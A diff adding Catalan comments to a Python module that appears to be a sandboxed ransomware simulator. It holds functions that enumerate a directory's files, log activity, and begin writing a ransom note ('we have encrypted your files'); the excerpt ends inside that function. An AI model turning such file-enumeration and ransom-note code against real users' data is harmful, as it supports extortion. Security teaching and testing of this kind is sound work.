@@ -2,8 +2,7 @@ import os
 import config
 from datetime import datetime
 
-# Configurem la ruta del log
-
+#Funció per a recorrer tots els elements d'un domini (subcarpetes i arxius)
 def llistar_fitxers(ruta):
     llista_final = []
     if os.path.exists(ruta):
@@ -14,17 +13,19 @@ def llistar_fitxers(ruta):
         return llista_final
     return []
 
+#Funció que permet escriure una activitat determinada al arxiu de logs
 def registrar_log(esdeveniment, fitxer):
-    # En lloc d'usar "logs/activity.log", usem la ruta del config
+
     ruta_real = config.FILE_LOGS
-    
-    # Ens assegurem que la carpeta data/logs existeixi realment
+
+    #Comprovació d'existència del fitxer (amb exist_ok=True)
     os.makedirs(os.path.dirname(ruta_real), exist_ok=True)
     
-    # Escrivim al fitxer definit al config (data/logs/activity.jsonl)
+    #Escriptura al fitxer definit al config.py (data/logs/activity.jsonl)
     with open(ruta_real, "a", encoding="utf-8") as f:
         f.write(f"[{esdeveniment}] Fitxer: {fitxer}\n")
 
+#Funció que permet extreure els logs del fitxer de logs .jsonl
 def llegir_logs():
     print("\n--- HISTORIAL D ACTIVITAT (LOGS) ---")
     if os.path.exists(config.FILE_LOGS):
@@ -41,6 +42,7 @@ def llegir_logs():
         print("[!] No hi ha logs disponibles.")
     print("------------------------------------\n")
 
+#Funció que genera una nota de rescat al directori indicat (Sandbox)
 def generar_nota_rescat(directori):
     contingut = (
         "HEM XIFRAT ELS TEUS FITXERS!\n\n"
